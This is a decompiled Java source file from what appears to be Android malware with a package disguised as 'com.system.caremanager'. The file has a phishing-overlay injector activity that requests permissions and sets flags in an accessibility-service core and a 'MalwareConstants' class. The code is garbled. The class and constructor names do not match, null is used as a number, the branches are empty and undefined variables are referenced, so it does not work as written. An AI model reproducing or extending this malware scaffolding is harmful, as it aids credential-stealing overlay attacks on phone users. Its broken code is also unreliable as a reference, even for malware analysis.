package com.system.caremanager;

import android.accessibilityservice.AccessibilityService;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;

public class OverlayInjector extends Activity {

    public PhishingOverlayInjector() {
        return;
    }

    public static boolean hasPermissions(Context param1, String[] param2) {
        if (param1 == null) {
            // branch: cond_1
        }
        if (param2 == null) {
            // branch: cond_1
        }
        int len = param2.length;
        if (null >= len) {
            // branch: cond_1
        }
        String item = param2[null];
        int result = ActivityCompat.checkSelfPermission(param1, item);
        if (result == null) {
            // branch: cond_0
        }
        return null;
        int val = null + 0x1;
        // continue loop -> :goto_0
        return 1;
    }

    public void finish() {
        Boolean result = Boolean.valueOf(null);
        DataPackagingEngine.asked = result;
        this.finishAndRemoveTask();
        return;
    }

    public void onCreate(Bundle param1) {
        try {
            this.onCreate(param1);
            Boolean result = Boolean.valueOf(1);
            AccessibilityServiceCore.fOR_prim = result;
            String[] result2 = DataPackagingEngine.PERMISSIONS();
            boolean result3 = PhishingOverlayInjector.hasPermissions(p0, result);
            if (result != null) {
                // branch: cond_0
            }
            int val = 151;
            ActivityCompat.requestPermissions(p0, result, val);
            // continue loop -> :goto_0
            } catch (Exception e) {
                e.printStackTrace();
            result.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onRequestPermissionsResult(int param1, String[] param2, int[] param3) {
        this.onRequestPermissionsResult(param1, param2, param3);
        int val = 151;
        if (param1 == val) {
            // branch: cond_0
        }
        // continue loop -> :goto_0
        int len = param3.length;
        if (/* if-lez len */) {
            // branch: cond_1
        }
        int item = param3[null];
        if (item != null) {
            // branch: cond_1
        }
        Boolean result = Boolean.valueOf(null);
        AccessibilityServiceCore.fOR_prim = result;
        AccessibilityServiceCore.ifFinishiInitPermission = 1;
        this.finish();
        AccessibilityEventMonitor.Event accessibilityEventMonitor.Event = new AccessibilityEventMonitor.Event();
        String Evnet_Type_PerfectSetting = MalwareConstants.Evnet_Type_PerfectSetting;
        AccessibilityEventMonitor.publish(accessibilityEventMonitor.Event);
        // continue loop -> :goto_0
        String[] result2 = DataPackagingEngine.PERMISSIONS();
        ActivityCompat.requestPermissions(p0, result, Evnet_Type_PerfectSetting);
        return;
    }

}